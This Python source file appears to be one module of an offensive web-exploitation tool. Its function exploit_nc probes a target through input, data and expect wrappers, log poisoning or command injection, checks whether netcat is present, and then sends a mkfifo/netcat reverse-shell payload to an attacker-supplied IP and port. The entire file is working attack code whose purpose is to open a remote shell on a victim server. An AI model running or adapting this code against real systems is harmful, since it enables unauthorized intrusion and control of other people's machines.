from src.httpreqs.post import POST
from src.httpreqs import request 
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import args
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo

def exploit_nc(exploit, method, ip, port):
    
    url = exploit['GETVAL']
    post = exploit["POSTVAL"]

    ncTest = "which%20nc"
    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"

    if(method == "INPUT"):
        res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "input wrapper")
            request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
            return True
    if(method == "DATA"):
        if(args.mode == "post"): 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, post, config.proxies, "", "")
        else: 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, "", config.proxies, "", "")
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "data wrapper")
            if(args.mode == "post"): 
                request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, post, config.proxies, "", "")
            else: 
                request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, "", config.proxies, "", "")
            return True
    if(method == "EXPECT"):
        if(args.mode == "post"): 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, post, config.proxies, "", "")
        else: 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, "", config.proxies, "", "")
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "expect wrapper")
            if(args.mode == "post"): 
                request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, post, config.proxies, "", "")
            else: 
                request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, "", config.proxies, "", "")
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(ncPayload), "", ncTest, "/nc", exploit['POSTVAL'])
        return True
   
    if(method == "CMD"):
        if(args.mode == "post"): 
            res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(ncTest)), config.proxies, "", "")
        else:
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(ncTest)), args.httpheaders, "", config.proxies, "", "")
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "command injection")
            if(args.mode == "post"):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(ncPayload)), post, config.proxies, "", "")
            else: 
                request.REQUEST(url.replace(config.tempArg, encode(ncPayload)), args.httpheaders, "", config.proxies, "", "")
            return True